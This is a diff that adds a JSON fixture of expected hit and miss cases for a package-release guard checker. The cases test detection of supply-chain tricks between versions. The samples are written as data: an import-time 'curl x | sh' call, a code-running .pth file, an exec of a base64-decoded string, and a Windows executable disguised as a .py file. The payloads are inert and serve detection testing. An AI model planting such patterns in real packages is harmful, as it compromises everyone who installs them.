@@ -1,0 +1,38 @@
+{
+  "schema": 1,
+  "about": "Examples for the post.json version_diff signals. new = files in this release, old = files in the previous release (null = nothing to compare). hit = this signal must appear. Run: python3 guard/rule_check.py",
+  "examples": {
+    "import_time": [
+      {"expect": "hit", "why": "New shell call that runs when the module is imported",
+       "new": {"pkg/__init__.py": "import os\nos.system('curl x | sh')\n"}, "old": {"pkg/__init__.py": "import os\n"}},
+      {"expect": "hit", "why": "Runs at import even inside an if",
+       "new": {"pkg/__init__.py": "import subprocess\nif True:\n    subprocess.Popen(['x'])\n"}, "old": {"pkg/__init__.py": "VERSION = 1\n"}},
+      {"expect": "miss", "why": "A call inside a function does not run at import",
+       "new": {"pkg/__init__.py": "import subprocess\ndef run():\n    subprocess.run(['ls'])\n"}, "old": {"pkg/__init__.py": "VERSION = 1\n"}},
+      {"expect": "miss", "why": "Call already in the previous release",
+       "new": {"pkg/__init__.py": "import os\nos.system('x')\nVERSION = 2\n"}, "old": {"pkg/__init__.py": "import os\nos.system('x')\nVERSION = 1\n"}},
+      {"expect": "miss", "why": "exec of a constant string is not a payload",
+       "new": {"pkg/compat.py": "exec('from os import path')\n"}, "old": {}}
+    ],
+    "binary_py": [
+      {"expect": "hit", "why": "Windows executable with a .py name (num2words 0.5.15)",
+       "new": {"pkg/_build.py": "MZ\u0000\u0000\u0003binary"}, "old": {}},
+      {"expect": "miss", "why": "Ordinary Python file",
+       "new": {"pkg/_build.py": "print('build')\n"}, "old": {}}
+    ],
+    "new_pth": [
+      {"expect": "hit", "why": "New .pth with an import line",
+       "new": {"evil.pth": "import os; os.system('x')\n"}, "old": {}},
+      {"expect": "miss", "why": ".pth that lists only a path",
+       "new": {"mypkg.pth": "/opt/mypkg/lib\n"}, "old": {}},
+      {"expect": "miss", "why": ".pth already in the previous release",
+       "new": {"keep.pth": "import keep\n"}, "old": {"keep.pth": "import keep\n"}}
+    ],
+    "encoded_payload": [
+      {"expect": "hit", "why": "Decodes and runs a long encoded string",
+       "new": {"pkg/x.py": "import base64\nexec(base64.b64decode('QUFB' + 'aGVsbG8gd29ybGQgdGhpcyBpcyBhIHBheWxvYWQgYmxvYiB0aGF0IGlzIGxvbmcgZW5vdWdoIHRvIGNvdW50IGFzIGFuIGVuY29kZWQgcGF5bG9hZCBmb3IgdGhlIGd1YXJkIGNoZWNrIGFuZCBpdCBrZWVwcyBnb2luZyBhbmQgZ29pbmcgYW5kIGdvaW5nIGFuZCBnb2luZyBhbmQgZ29pbmcgYW5kIGdvaW5nIGFuZCBnb2luZyBhbmQgZ29pbmcgYW5kIGdvaW5nIGFuZCBnb2luZyBhbmQgZ29pbmcgYW5kIGdvaW5nIGFuZCBnb2luZyBhbmQgZ29pbmcgYW5kIGdvaW5nIGFuZCBnb2luZyBhbmQgZ29pbmcgYW5kIGdvaW5nIGFuZCBnb2luZw=='))\n"}, "old": {}},
+      {"expect": "miss", "why": "Long string that is never decoded or run (data table)",
+       "new": {"pkg/table.py": "TABLE = 'aGVsbG8gd29ybGQgdGhpcyBpcyBhIHBheWxvYWQgYmxvYiB0aGF0IGlzIGxvbmcgZW5vdWdoIHRvIGNvdW50IGFzIGFuIGVuY29kZWQgcGF5bG9hZCBmb3IgdGhlIGd1YXJkIGNoZWNrIGFuZCBpdCBrZWVwcyBnb2luZyBhbmQgZ29pbmcgYW5kIGdvaW5nIGFuZCBnb2luZyBhbmQgZ29pbmcgYW5kIGdvaW5nIGFuZCBnb2luZyBhbmQgZ29pbmcgYW5kIGdvaW5nIGFuZCBnb2luZyBhbmQgZ29pbmcgYW5kIGdvaW5nIGFuZCBnb2luZyBhbmQgZ29pbmcgYW5kIGdvaW5nIGFuZCBnb2luZyBhbmQgZ29pbmcgYW5kIGdvaW5nIGFuZCBnb2luZw=='\n"}, "old": {}}
+    ]
+  }
+}
